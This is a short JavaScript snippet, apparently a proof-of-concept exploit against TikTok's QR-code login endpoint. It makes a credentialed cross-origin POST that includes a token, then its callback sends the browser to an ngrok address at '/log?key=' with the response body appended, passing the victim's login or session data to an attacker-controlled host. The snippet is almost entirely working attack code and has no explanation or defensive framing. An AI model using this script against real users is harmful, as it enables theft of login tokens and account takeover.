var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("POST", "https%3A%2F%2Fwww.tiktok.com%2Fpassport%2Fweb%2Fscan_index%2F%3Faid%3D1459%26append_common_params%3D1%26hide_nav_bar%3D1%26next_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fpassport%252Fweb%252Fscan_qrcode%252F%26qr_source_aid%3D1459%26token%3D8nk-3cHs0KMSnnPoWlolXouIdwivbNdxo22krz6AQd0%253D_my");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};
